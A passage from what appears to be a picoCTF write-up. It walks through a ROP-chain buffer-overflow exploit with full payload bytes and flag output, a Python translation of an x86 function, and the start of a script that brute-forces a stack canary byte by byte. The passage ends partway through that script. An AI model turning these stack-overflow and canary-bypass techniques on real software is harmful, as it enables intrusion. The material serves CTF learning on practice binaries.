<p>Gynvael makes a ROP chain by looking at the asm. Gynvael uses IDA but you can use <code>objdump -d vuln</code> to get the asm also.</p>
<p>In the win_fn1() function we have this:</p>
<pre><code class="language-assembly" data-lang="assembly">0000000000400767 &lt;win_fn1&gt;:
  400767: 55                    push   %rbp
  400768: 48 89 e5              mov    %rsp,%rbp
  40076b: 89 7d fc              mov    %edi,-0x4(%rbp)
  40076e: 81 7d fc ef be ad de  cmpl   $0xdeadbeef,-0x4(%rbp)
  400775: 75 07                 jne    40077e &lt;win_fn1+0x17&gt;
  400777: c6 05 fb 08 20 00 01  movb   $0x1,0x2008fb(%rip)        # 601079 &lt;win1&gt;
  40077e: 90                    nop
  40077f: 5d                    pop    %rbp
  400780: c3                    retq 
</code></pre><p>First we can just jump to the <code>movb   $0x1,0x2008fb(%rip)</code> which sets the win1 var to 1. This way we avoid having to set the parameters of the function.</p>
<p>We&rsquo;ll have to make the stack look like this:</p>
<pre><code>AAAAAAAAAAAAAAAA...  # First we have some padding so we can overflow the stack. We'll figure out how much later.
0x400777             # After gets() is called and vuln() returns, execution will transfer to this address which is the address of the instruction that sets win1 to 1.
0x4141414141414141   # There's a pop %rbp after win1 is set. We need 8 bytes of junk on the stack to pop off.
ADDR                 # This is the address of what we want to execute next. We'll figure what address we want to chain in next.
</code></pre><p>In the asm of win_fn2() we see this for the last 4 instruction:</p>
<pre><code class="language-assembly" data-lang="assembly">  4007b4:  c6 05 bf 08 20 00 01  movb   $0x1,0x2008bf(%rip)        # 60107a &lt;win2&gt;
  4007bb: 90                    nop
  4007bc: 5d                    pop    %rbp
  4007bd: c3                    retq
</code></pre><p>We want ADDR to be the address of the <code>movb   $0x1,0x2008bf(%rip)</code> instruction, since that sets the global win2 variable to 1. Now our exploit looks like this:</p>
<pre><code>AAAAAAAAAAAAAAAA...  # First we have some padding so we can overflow the stack. We'll figure out how much later.
0x400777             # After gets() is called and vuln() returns, execution will transfer to this address which is the address of the instruction that sets win1 to 1.
CCCCCCCC             # There's a pop %rbp after win1 is set. We need 8 bytes of junk on the stack to pop off.
0x4007b4             # This is the address of the instruction that sets win2 to 1.
</code></pre><p>After setting win2, we see a <code>pop %rbp</code>, just like the win_fn1() function. So we add some more junk data for that.</p>
<pre><code>AAAAAAAAAAAAAAAA...  # First we have some padding so we can overflow the stack. We'll figure out how much later.
0x400777             # After gets() is called and vuln() returns, execution will transfer to this address which is the address of the instruction that sets win1 to 1.
CCCCCCCC             # There's a pop %rbp after win1 is set. We need 8 bytes of junk on the stack to pop off.
0x4007b4             # This is the address of the instruction that sets win2 to 1.
CCCCCCCC             # 8 bytes of junk for the pop rbp (doesn't matter what we put here, just needs to be 8 bytes)
</code></pre><p>Finally the <code>ret</code> in win_fn2() means we need an ADDR2 to return to:</p>
<pre><code>AAAAAAAAAAAAAAAA...  # First we have some padding so we can overflow the stack. We'll figure out how much later.
0x400777             # After gets() is called and vuln() returns, execution will transfer to this address which is the address of the instruction that sets win1 to 1.
CCCCCCCC             # There's a pop %rbp after win1 is set. We need 8 bytes of junk on the stack to pop off.
0x4007b4             # This is the address of the instruction that sets win2 to 1.
CCCCCCCC             # 8 bytes of junk for the pop rbp (doesn't matter what we put here, just needs to be 8 bytes)
ADDR2                # We want to take execution to this address next
</code></pre><p>Now that the exploit sets win1 and win2, all we need to do is call the win_fn() function to get our flag. We find that the address of win_fn() is 0x0000000004007be.</p>
<p>Make ADDR2 the address of win_fn()</p>
<pre><code>AAAAAAAAAAAAAAAA...  # First we have some padding so we can overflow the stack. We'll figure out how much later.
0x400777             # After gets() is called and vuln() returns, execution will transfer to this address which is the address of the instruction that sets win1 to 1.
CCCCCCCC             # There's a pop %rbp after win1 is set. We need 8 bytes of junk on the stack to pop off.
0x4007b4             # This is the address of the instruction that sets win2 to 1.
CCCCCCCC             # 8 bytes of junk for the pop rbp (doesn't matter what we put here, just needs to be 8 bytes)
0x4007be             # Address of win_fn() which prints the flag
</code></pre><p>Now all we have to do with the exploit is find how much padding we need to overflow the stack and get the return address overwritten with our address. The asm for vuln() shows this:</p>
<pre><code class="language-assembly" data-lang="assembly">00000000004008b2 &lt;vuln&gt;:
  4008b2: 55                    push   %rbp
  4008b3: 48 89 e5              mov    %rsp,%rbp
  4008b6: 48 83 ec 40           sub    $0x40,%rsp
  4008ba: 48 8d 45 c0           lea    -0x40(%rbp),%rax
  4008be: 48 89 c7              mov    %rax,%rdi
  4008c1: b8 00 00 00 00        mov    $0x0,%eax
  4008c6: e8 65 fd ff ff        callq  400630 &lt;gets@plt&gt;
  4008cb: 90                    nop
  4008cc: c9                    leaveq 
  4008cd: c3                    retq 
</code></pre><p>The <code>sub    $0x40,%rsp</code> tells us that 0x40 bytes is allocated on the stack for buf. This means that 0x40 bytes or 64 bytes of padding is needed to overflow the buffer. We also need an additional 8 bytes for the saved rbp that we need to overwrite before reaching the return address.</p>
<p>We get this now:</p>
<pre><code>64 A's               # 0x40 bytes or 64 bytes needed to overwrite the entire buffer
BBBBBBBB             # 8 bytes of junk data needed to overwrite the saved rbp
0x400777             # Address called when vuln() returns to the instruction that sets win1 to 1.
CCCCCCCC             # There's a pop %rbp after win1 is set. We need 8 bytes of junk on the stack to pop off.
0x4007b4             # This is the address of the instruction that sets win2 to 1.
CCCCCCCC             # 8 bytes of junk for the pop rbp (doesn't matter what we put here, just needs to be 8 bytes)
0x4007be             # Address of win_fn() which prints the flag
</code></pre><p>We just need to align all the addresses since they&rsquo;re 64-bit addresses:</p>
<pre><code>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
BBBBBBBB
0x0000000000400777
CCCCCCCC
0x00000000004007b4
CCCCCCCC
0x00000000004007be             
</code></pre><p>Make the addresses little endian:</p>
<pre><code>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
BBBBBBBB
\x77\x07\x40\x00\x00\x00\x00\x00
CCCCCCCC
\xb4\x07\x40\x00\x00\x00\x00\x00 
CCCCCCCC
\xbe\x07\x40\x00\x00\x00\x00\x00
</code></pre><p>Final Exploit (combine everything):</p>
<pre><code>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB\x77\x07\x40\x00\x00\x00\x00\x00CCCCCCCC\xb4\x07\x40\x00\x00\x00\x00\x00CCCCCCCC\xbe\x07\x40\x00\x00\x00\x00\x00
</code></pre><p>Pipe our exploit into the vuln program:</p>
<pre><code class="language-console" data-lang="console">$ echo -e 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB\x77\x07\x40\x00\x00\x00\x00\x00CCCCCCCC\xb4\x07\x40\x00\x00\x00\x00\x00CCCCCCCC\xbe\x07\x40\x00\x00\x00\x00\x00' | ./vuln
Welcome to 64-bit. Can you match these numbers?
Segmentation fault (core dumped)
</code></pre><p>It looks like the it didn&rsquo;t work. The stack is probably misaligned just like last time (NewOverflow-1). To align the stack, we can just put in the addresses to ret since ret&rsquo;s are the equivalent to nop (no operation) in return oriented programming.</p>
<p>Find the address of a ret:</p>
<pre><code>$ objdump -d vuln | grep retq
  4005de: c3                    retq   
  4006b0: f3 c3                 repz retq 
  4006e9: c3                    retq   
  400729: c3                    retq   
  40074a: c3                    retq   
  400750: f3 c3                 repz retq 
  400780: c3                    retq   
  4007bd: c3                    retq   
  40084c: c3                    retq   
  4008b1: c3                    retq   
  4008cd: c3                    retq   
  400936: c3                    retq   
  4009a4: c3                    retq   
  4009b0: f3 c3                 repz retq 
  4009bc: c3                    retq
</code></pre><p>Just use any of the above (excluding the <code>repz retq</code>). Gynvael decides to use the 0x40084c address. Put the address of the return in the exploit so that when a ret instruction is executed, the next item on the stack is the address of our ret and then it continues the chain. Here it&rsquo;s placed after the <code>BBBBBB</code>.:</p>
<pre><code>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB\x4c\x08\x40\x00\x00\x00\x00\x00\x77\x07\x40\x00\x00\x00\x00\x00CCCCCCCC\xb4\x07\x40\x00\x00\x00\x00\x00CCCCCCCC\xbe\x07\x40\x00\x00\x00\x00\x00
</code></pre><p>When we use the modified exploit, it works.</p>
<pre><code class="language-console" data-lang="console">$ echo -e 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB\x4c\x08\x40\x00\x00\x00\x00\x00\x77\x07\x40\x00\x00\x00\x00\x00CCCCCCCC\xb4\x07\x40\x00\x00\x00\x00\x00CCCCCCCC\xbe\x07\x40\x00\x00\x00\x00\x00' | ./vuln
Welcome to 64-bit. Can you match these numbers?
picoCTF{r0p_1t_d0nT_st0p_1t_535c741c}
Segmentation fault (core dumped)
</code></pre><p>Some instructions need stack alignments of 16 bytes instead of 8 bytes, which is why we needed to add another 8 bytes in our exploit with the ret.</p>
<h2 id="asm2---reverse-engineering">asm2 - Reverse Engineering</h2>
<p>In the last asm1 challenge, Gynvael just ran the program to find the flag; this time Gynvael actually analyzes the code and converts it to python.</p>
<pre><code class="language-assembly" data-lang="assembly">asm2:
        &lt;+0&gt;:   push   ebp
        &lt;+1&gt;:   mov    ebp,esp
        &lt;+3&gt;:   sub    esp,0x10
        &lt;+6&gt;:   mov    eax,DWORD PTR [ebp+0xc]
        &lt;+9&gt;:   mov    DWORD PTR [ebp-0x4],eax
        &lt;+12&gt;:  mov    eax,DWORD PTR [ebp+0x8]
        &lt;+15&gt;:  mov    DWORD PTR [ebp-0x8],eax
        &lt;+18&gt;:  jmp    0x50c &lt;asm2+31&gt;
        &lt;+20&gt;:  add    DWORD PTR [ebp-0x4],0x1
        &lt;+24&gt;:  add    DWORD PTR [ebp-0x8],0xaf
        &lt;+31&gt;:  cmp    DWORD PTR [ebp-0x8],0xa3d3
        &lt;+38&gt;:  jle    0x501 &lt;asm2+20&gt;
        &lt;+40&gt;:  mov    eax,DWORD PTR [ebp-0x4]
        &lt;+43&gt;:  leave
        &lt;+44&gt;:  ret
</code></pre><p>Python translation:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#e6db74">&#34;&#34;&#34; We know there are two arguments because of the problem description &#34;&#34;&#34;</span>
<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">asm2</span>(arg1, arg2):
  <span style="color:#e6db74">&#34;&#34;&#34; Standard function prolouge: sets up the stack of the function &#34;&#34;&#34;</span> 
  <span style="color:#75715e"># &lt;+0&gt;:   push   ebp            ; This saves the old ebp from the previous function, so that when we can revert back when we return</span>
  <span style="color:#75715e"># &lt;+1&gt;:   mov    ebp,esp        ; Sets the new ebp</span>
  <span style="color:#75715e"># &lt;+3&gt;:   sub    esp,0x10       ; Creates 0x10 or 16 bytes for local variables(s) </span>

  <span style="color:#e6db74">&#34;&#34;&#34; The stack looks like this after the function prolouge:        &#34;&#34;&#34;</span>

                                                                    <span style="color:#e6db74">&#34;&#34;&#34; 
</span><span style="color:#e6db74">      [    A   ]                                                  
</span><span style="color:#e6db74">      [    B   ]                                                  
</span><span style="color:#e6db74">      [    C   ]                                                  
</span><span style="color:#e6db74">      [    D   ]                                                  
</span><span style="color:#e6db74">      [Old EBP ]   &lt;-- EBP                                    
</span><span style="color:#e6db74">      [  RET   ]                                                  
</span><span style="color:#e6db74">      [  ARG1  ]                                                 
</span><span style="color:#e6db74">      [  ARG2  ]
</span><span style="color:#e6db74">                                                                    &#34;&#34;&#34;</span>                                                   
  <span style="color:#e6db74">&#34;&#34;&#34; In the above stack, each [] represents 4 bytes. A, B, C, and D all represent local 4 byte variables since we know that that a total of 16 bytes were located for local variables. Right now we don&#39;t know how many actual variables there are, but we&#39;re just assuming there&#39;s four 4 byte vars right now. It could be sixteen 1 byte variables, but we don&#39;t know yet.&#34;&#34;&#34;</span>


  <span style="color:#75715e"># &lt;+6&gt;:   mov    eax,DWORD PTR [ebp+0xc]  ; 0xc is 12. So ebp + 12 points to arg2 if you use the diagram above to count</span>
  eax <span style="color:#f92672">=</span> arg2

  <span style="color:#75715e"># &lt;+9&gt;:   mov    DWORD PTR [ebp-0x4],eax  ; ebp - 4 is the local variable D</span>
  d <span style="color:#f92672">=</span> eax

  <span style="color:#75715e"># &lt;+12&gt;:  mov    eax,DWORD PTR [ebp+0x8]</span>
  eax <span style="color:#f92672">=</span> arg1

  <span style="color:#75715e"># &lt;+15&gt;:  mov    DWORD PTR [ebp-0x8],eax</span>
  c <span style="color:#f92672">=</span> eax

  <span style="color:#75715e"># &lt;+18&gt;:  jmp    0x50c &lt;asm2+31&gt;</span>


  <span style="color:#75715e"># &lt;+20&gt;:  add    DWORD PTR [ebp-0x4],0x1</span>
  <span style="color:#75715e"># &lt;+24&gt;:  add    DWORD PTR [ebp-0x8],0xaf</span>
  d <span style="color:#f92672">+=</span><span style="color:#ae81ff">1</span>
  c <span style="color:#f92672">+=</span> <span style="color:#ae81ff">0xaf</span>

  <span style="color:#75715e"># &lt;+31&gt;:  cmp    DWORD PTR [ebp-0x8],0xa3d3</span>
  <span style="color:#75715e"># &lt;+38&gt;:  jle    0x501 &lt;asm2+20&gt;</span>
  <span style="color:#66d9ef">if</span> c <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0xa3d3</span>:
    goto asm2<span style="color:#f92672">+</span><span style="color:#ae81ff">20</span>

  <span style="color:#75715e"># &lt;+40&gt;:  mov    eax,DWORD PTR [ebp-0x4] ; eax is where the return value is usually in x86</span>
  <span style="color:#75715e"># &lt;+43&gt;:  leave</span>
  <span style="color:#75715e"># &lt;+44&gt;:  ret</span>
  <span style="color:#66d9ef">return</span> d

</code></pre></div><p>There are no gotos in python, so turn the goto into a while loop and simplify a bit:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">asm2</span>(arg1, arg2):
  <span style="color:#75715e"># &lt;+6&gt;:   mov    eax,DWORD PTR [ebp+0xc]  ; 0xc is 12. So ebp + 12 points to arg2 if you use the diagram above to count</span>
  <span style="color:#75715e"># &lt;+9&gt;:   mov    DWORD PTR [ebp-0x4],eax  ; ebp - 4 is the local variable D</span>
  d <span style="color:#f92672">=</span> arg2

  <span style="color:#75715e"># &lt;+12&gt;:  mov    eax,DWORD PTR [ebp+0x8]</span>
  <span style="color:#75715e"># &lt;+15&gt;:  mov    DWORD PTR [ebp-0x8],eax</span>
  c <span style="color:#f92672">=</span> arg1

  <span style="color:#75715e"># &lt;+18&gt;:  jmp    0x50c &lt;asm2+31&gt;</span>
  <span style="color:#75715e"># &lt;+20&gt;:  add    DWORD PTR [ebp-0x4],0x1</span>
  <span style="color:#75715e"># &lt;+24&gt;:  add    DWORD PTR [ebp-0x8],0xaf</span>
  <span style="color:#75715e"># &lt;+31&gt;:  cmp    DWORD PTR [ebp-0x8],0xa3d3</span>
  <span style="color:#75715e"># &lt;+38&gt;:  jle    0x501 &lt;asm2+20&gt;</span>
  <span style="color:#66d9ef">while</span> c <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0xa3d3</span>:
    d<span style="color:#f92672">+=</span><span style="color:#ae81ff">1</span>
    c<span style="color:#f92672">+=</span> <span style="color:#ae81ff">0xaf</span>

  <span style="color:#75715e"># &lt;+40&gt;:  mov    eax,DWORD PTR [ebp-0x4] ; eax is where the return value is usually in x86</span>
  <span style="color:#75715e"># &lt;+43&gt;:  leave</span>
  <span style="color:#75715e"># &lt;+44&gt;:  ret</span>
  <span style="color:#66d9ef">return</span> d

</code></pre></div><p>If we want to be even more accurate, we would account for the fact that x86 asm operates on 32 bit integers while python doesn&rsquo;t really have a limit on the size of integers. So we can truncate python&rsquo;s integers to 32 bits. We don&rsquo;t have to do this for this challenge since it probably won&rsquo;t matter.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">asm2</span>(arg1, arg2):
  <span style="color:#75715e"># &lt;+6&gt;:   mov    eax,DWORD PTR [ebp+0xc]  ; 0xc is 12. So ebp + 12 points to arg2 if you use the diagram above to count</span>
  <span style="color:#75715e"># &lt;+9&gt;:   mov    DWORD PTR [ebp-0x4],eax  ; ebp - 4 is the local variable D</span>
  d <span style="color:#f92672">=</span> arg2

  <span style="color:#75715e"># &lt;+12&gt;:  mov    eax,DWORD PTR [ebp+0x8]</span>
  <span style="color:#75715e"># &lt;+15&gt;:  mov    DWORD PTR [ebp-0x8],eax</span>
  c <span style="color:#f92672">=</span> arg1

  <span style="color:#75715e"># &lt;+18&gt;:  jmp    0x50c &lt;asm2+31&gt;</span>
  <span style="color:#75715e"># &lt;+20&gt;:  add    DWORD PTR [ebp-0x4],0x1</span>
  <span style="color:#75715e"># &lt;+24&gt;:  add    DWORD PTR [ebp-0x8],0xaf</span>
  <span style="color:#75715e"># &lt;+31&gt;:  cmp    DWORD PTR [ebp-0x8],0xa3d3</span>
  <span style="color:#75715e"># &lt;+38&gt;:  jle    0x501 &lt;asm2+20&gt;</span>
  <span style="color:#66d9ef">while</span> c <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0xa3d3</span>:
    d <span style="color:#f92672">=</span> (d <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xffffffff</span> <span style="color:#75715e"># Apply a mask to truncate to 32 bits</span>
    c <span style="color:#f92672">=</span> (c <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xaf</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xffffffff</span> <span style="color:#75715e"># Apply a mask to truncate to 32 bits</span>

  <span style="color:#75715e"># &lt;+40&gt;:  mov    eax,DWORD PTR [ebp-0x4] ; eax is where the return value is usually in x86</span>
  <span style="color:#75715e"># &lt;+43&gt;:  leave</span>
  <span style="color:#75715e"># &lt;+44&gt;:  ret</span>
  <span style="color:#66d9ef">return</span> d
</code></pre></div><p>Now run the function with the provided arguments:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">asm2</span>(arg1, arg2):
  <span style="color:#75715e"># &lt;+6&gt;:   mov    eax,DWORD PTR [ebp+0xc]  ; 0xc is 12. So ebp + 12 points to arg2 if you use the diagram above to count</span>
  <span style="color:#75715e"># &lt;+9&gt;:   mov    DWORD PTR [ebp-0x4],eax  ; ebp - 4 is the local variable D</span>
  d <span style="color:#f92672">=</span> arg2

  <span style="color:#75715e"># &lt;+12&gt;:  mov    eax,DWORD PTR [ebp+0x8]</span>
  <span style="color:#75715e"># &lt;+15&gt;:  mov    DWORD PTR [ebp-0x8],eax</span>
  c <span style="color:#f92672">=</span> arg1

  <span style="color:#75715e"># &lt;+18&gt;:  jmp    0x50c &lt;asm2+31&gt;</span>
  <span style="color:#75715e"># &lt;+20&gt;:  add    DWORD PTR [ebp-0x4],0x1</span>
  <span style="color:#75715e"># &lt;+24&gt;:  add    DWORD PTR [ebp-0x8],0xaf</span>
  <span style="color:#75715e"># &lt;+31&gt;:  cmp    DWORD PTR [ebp-0x8],0xa3d3</span>
  <span style="color:#75715e"># &lt;+38&gt;:  jle    0x501 &lt;asm2+20&gt;</span>
  <span style="color:#66d9ef">while</span> c <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0xa3d3</span>:
    d <span style="color:#f92672">=</span> (d <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xffffffff</span> <span style="color:#75715e"># Apply a mask to truncate to 32 bits</span>
    c <span style="color:#f92672">=</span> (c <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xaf</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xffffffff</span> <span style="color:#75715e"># Apply a mask to truncate to 32 bits</span>

  <span style="color:#75715e"># &lt;+40&gt;:  mov    eax,DWORD PTR [ebp-0x4] ; eax is where the return value is usually in x86</span>
  <span style="color:#75715e"># &lt;+43&gt;:  leave</span>
  <span style="color:#75715e"># &lt;+44&gt;:  ret</span>
  <span style="color:#66d9ef">return</span> d

<span style="color:#66d9ef">print</span>(hex(asm2(<span style="color:#ae81ff">0xc</span>,<span style="color:#ae81ff">0x15</span>)))
</code></pre></div><pre><code class="language-console" data-lang="console">$ python test.py
0x105
</code></pre><p>This approach of translating into a higher level language is a standard way of reverse engineering.</p>
<h2 id="canary---binary-exploitation">CanaRy - Binary Exploitation</h2>
<p>A canary is just a random value on the stack in between the local variables and the return address. Thus if an attacker overwrites it by trying to overwrite the return address, the attacker will change the value of the canary and the program will exit immediately.</p>
<p>Reconissance:</p>
<pre><code class="language-console" data-lang="console">$ file vuln
vuln: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 3.2.0, BuildID[sha1]=6cfe75e5f3db954bad5a09eb57527c5a0d727b8f, not stripped
$ checksec --file=vuln
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Full RELRO      No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   vuln
</code></pre><p>No canary means that the program has a custom canary implementation. The program also has ASLR/PIE and NX enabled (non executable stack).</p>
<p>Like every other binary challenge, code to make exploitation easier (no buffering stdout and makes sure priveleges aren&rsquo;t dropped)</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">setvbuf(stdout, NULL, _IONBF, <span style="color:#ae81ff">0</span>);

<span style="color:#66d9ef">int</span> i;
gid_t gid <span style="color:#f92672">=</span> getegid();
setresgid(gid, gid, gid);
</code></pre></div><p>The read_canary() function:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">read_canary</span>() {
  FILE <span style="color:#f92672">*</span>f <span style="color:#f92672">=</span> fopen(<span style="color:#e6db74">&#34;/problems/canary_0_2aa953036679658ee5e0cc3e373aa8e0/canary.txt&#34;</span>,<span style="color:#e6db74">&#34;r&#34;</span>);
  <span style="color:#66d9ef">if</span> (f <span style="color:#f92672">==</span> NULL) {
    printf(<span style="color:#e6db74">&#34;[ERROR]: Trying to Read Canary</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
    exit(<span style="color:#ae81ff">0</span>);
  }
  fread(key,<span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">char</span>),KEY_LEN,f);
  fclose(f);
}
</code></pre></div><p>Canary is read from a file called canary.txt and puts the canary in a global variable called key.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#define KEY_LEN 4
</span><span style="color:#75715e"></span>...
<span style="color:#66d9ef">char</span> key[KEY_LEN];
</code></pre></div><p>We see that the key canary is only 4 bytes.</p>
<p>There&rsquo;s a constant canary since the canary is read from a file which allows the canary to be bruteforced. Usually this isn&rsquo;t found in the wild except in fork servers where all the children processes have the same canary or in Windows XP&rsquo;s kernel.</p>
<p>Let&rsquo;s look at the vuln() function:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">...
<span style="color:#66d9ef">char</span> canary[KEY_LEN];
<span style="color:#66d9ef">char</span> buf[BUF_SIZE];
<span style="color:#66d9ef">char</span> user_len[BUF_SIZE];
...
</code></pre></div><p>This order of declaration means the stack looks like this:</p>
<pre><code>[RETURN ADDRESSS]
[ Old Saved EBP ]
[ Canary Buffer ]
[   Buf buffer  ]
[user_len buffer]
</code></pre><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">...
memcpy(canary,key,KEY_LEN);
...
</code></pre></div><p>This copies the canary from <code>key</code> to <code>canary</code>. This is also usually how it work. The cananry is copied from a &ldquo;master cookie&rdquo; (stored in a hidden location) at the beginning of the function.</p>
<p>The following just reads a length from the user:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">while</span> (x<span style="color:#f92672">&lt;</span>BUF_SIZE) {
      read(<span style="color:#ae81ff">0</span>,user_len<span style="color:#f92672">+</span>x,<span style="color:#ae81ff">1</span>);
      <span style="color:#66d9ef">if</span> (user_len[x]<span style="color:#f92672">==</span><span style="color:#e6db74">&#39;\n&#39;</span>) <span style="color:#66d9ef">break</span>;
      x<span style="color:#f92672">++</span>;
}
sscanf(user_len,<span style="color:#e6db74">&#34;%d&#34;</span>,<span style="color:#f92672">&amp;</span>count);
</code></pre></div><p>This reads user input, but it trusts the length we give. Since we control <code>count</code>, we can cause a buffer overflow.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">read(<span style="color:#ae81ff">0</span>,buf,count);
</code></pre></div><p>This just checks if the canary was overwritten:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">if</span> (memcmp(canary,key,KEY_LEN)) {
  printf(<span style="color:#e6db74">&#34;*** Stack Smashing Detected *** : Canary Value Corrupt!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
  exit(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
}
</code></pre></div><p>We want to jump to the flag after bypassing the canary:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">display_flag</span>() {
  <span style="color:#66d9ef">char</span> buf[FLAG_LEN];
  FILE <span style="color:#f92672">*</span>f <span style="color:#f92672">=</span> fopen(<span style="color:#e6db74">&#34;flag.txt&#34;</span>,<span style="color:#e6db74">&#34;r&#34;</span>);
  <span style="color:#66d9ef">if</span> (f <span style="color:#f92672">==</span> NULL) {
    printf(<span style="color:#e6db74">&#34;&#39;flag.txt&#39; missing in the current directory!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
    exit(<span style="color:#ae81ff">0</span>);
  }
  fgets(buf,FLAG_LEN,f);
  puts(buf);
  fflush(stdout);
}
</code></pre></div><p>The way we attack the canary is brute force the canary one byte at a time. Instead of brute forcing 4 bytes or around 4 billion combinations (2^32), bruteforcing one byte at a time only has 256 (2^8) combinations per byte. We can just overwrite one byte of the canary at a time, and it we guess that byte correctly, we won&rsquo;t see the <code>*** Stack Smashing Detected ***</code> message. When we guess the first byte correctly, we can then use that first byte and then guess the second byte. Then when we guess the second byte correctly, we can guess the third and so on. Once we get the canary, we can overwrite the buffer, overwrite the canary with the right canary, overwrite some stuff in between the canary and return address, and then overwrite the return address with the address of display_flag().</p>
<p>Gynvael uses IDA to make sure the buffer is right next to the canary in memory.</p>
<p>Script to find canary:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> subprocess

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">call</span>(sz, t):
  <span style="color:#66d9ef">assert</span> sz<span style="color:#f92672">&gt;=</span><span style="color:#ae81ff">32</span>
  payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
  payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">%i</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> sz <span style="color:#75715e"># size of our input</span>
  payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">32</span> <span style="color:#75715e"># To fill the buf buffer</span>
  payload <span style="color:#f92672">+=</span> chr(t[<span style="color:#ae81ff">0</span>]) <span style="color:#f92672">+</span> chr(t[<span style="color:#ae81ff">1</span>]) <span style="color:#f92672">+</span> chr(t[<span style="color:#ae81ff">2</span>]) <span style="color:#f92672">+</span> chr(t[<span style="color:#ae81ff">3</span>]) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>

  p <span style="color:#f92672">=</span> subprocess<span style="color:#f92672">.</span>Popen([<span style="color:#e6db74">&#34;./vuln&#34;</span>], stdin<span style="color:#f92672">=</span>subprocess<span style="color:#f92672">.</span>PIPE, stdout<span style="color:#f92672">=</span>subprocess<span style="color:#f92672">.</span>PIPE) 
  (stdout, stderror) <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>communicate(payload)

  <span style="color:#66d9ef">print</span> stdout

